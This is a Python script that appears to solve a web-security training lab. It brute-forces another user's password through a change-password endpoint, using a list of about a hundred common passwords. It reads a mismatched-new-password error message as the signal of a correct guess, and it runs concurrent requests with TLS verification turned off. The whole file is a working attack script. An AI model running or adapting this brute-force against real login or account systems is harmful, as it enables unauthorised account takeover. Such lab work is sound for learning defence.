'''
Lab Title: Password brute-force via password change
'''

import asyncio
import aiohttp
import sys
import ssl
import requests
import aiofiles

requests.packages.urllib3.disable_warnings()
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

url1 = 'https://0a25006e038733c180bcbc9200840041.web-security-academy.net/login'
url2 = 'https://0a25006e038733c180bcbc9200840041.web-security-academy.net/my-account/change-password'

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://0ab200c10355667782fbb00700920053.web-security-academy.net/my-account?id=carlos'
    
}
attempts = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
    ]

found = asyncio.Event()
def get_session():
    print('fetching session')
    data = {
        'username': 'wiener',
        'password': 'peter'
    }
    r = requests.post(url1, headers=headers, data=data, verify=False, allow_redirects=False)
    print(r.status_code)
    cookies = {
        'session': r.cookies.get('session')
    }
    print(cookies)
    return cookies


async def attempt_password(sem, session, cookies, pwd, i):
    async with sem:
        if found.is_set():
            return
        sys.stdout.write(f'\r Attempt Number: {i}')
        sys.stdout.flush()
        data = {
            'username': 'carlos',
            'current-password': pwd,
            'new-password-1': '123',
            'new-password-2': 'abc'
        }
        try:
            async with session.post(url2, cookies=cookies, headers=headers, data=data, ssl=ssl_context) as r:
                resp = await r.text()
                if 'New passwords do not match' in resp:
                    found.set()
                    print(f'Found password: {pwd}')

                async with aiofiles.open('./log.txt', 'a') as file:
                    await file.write(f'[{r.status}] Tried: {pwd}, {cookies} === And Result is {"Found" if found.is_set() else "Not yet"}\n')

        except Exception as e:
            print(f'\n [-] Error: {e}')




async def main():
    cookies = get_session()
    sem = asyncio.Semaphore(10)
    connector = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            attempt_password(sem, session, cookies, pwd, i+1)
            for i, pwd in enumerate(attempts)
        ]
        await asyncio.gather(*tasks)


if __name__ == '__main__':
    asyncio.run(main())